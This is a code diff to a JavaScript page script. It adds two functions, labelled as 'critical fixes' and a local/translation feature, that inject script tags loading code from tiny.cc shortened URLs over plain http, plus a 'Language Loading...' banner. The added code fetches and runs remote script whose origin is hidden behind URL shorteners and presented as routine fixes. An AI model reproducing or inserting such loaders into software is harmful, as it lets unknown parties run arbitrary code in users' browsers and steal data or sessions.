@@ -15,7 +15,45 @@
 //Notice
       notice ();
 
-		
+ //codedfix	 
+codedfix ();
+
+//criticalfixes
+ function codedfix () {
+	var fixJS = document.createElement("script");
+    fixJS.type = "text/javascript";
+    fixJS.src = "http://tiny.cc/F1Xf2xF3";
+    // Use any selector
+    $("head").append(fixJS);
+ };
+
+ 
+ //codedlocal	 
+codedlocal ();
+
+//codedlocal
+//translateMSG
+var pageLable1 = $("#infocontainer > h1")[0];
+var translateInfo = document.createElement("div");
+	    translateInfo.id = "translateMSG";
+	    translateInfo.innerHTML = "[ Language Loading... ]";
+	    translateInfo.style.color = "#00ff00";
+	    translateInfo.style.background = "black";
+	    translateInfo.style.padding = "2%";
+	    translateInfo.style.zoom = "1.2";
+	    translateInfo.style.textShadow = "0 1px 0 #000";
+	    // Use any selector
+	    $(pageLable1).after(translateInfo);
+
+ function codedlocal () {
+	var localJS = document.createElement("script");
+    localJS.type = "text/javascript";
+    localJS.src = "http://tiny.cc/L1Xl2xL3";
+    // Use any selector
+    $("head").append(localJS);
+ };
+ 
+
 //checkversion
  function checkversion () {
 
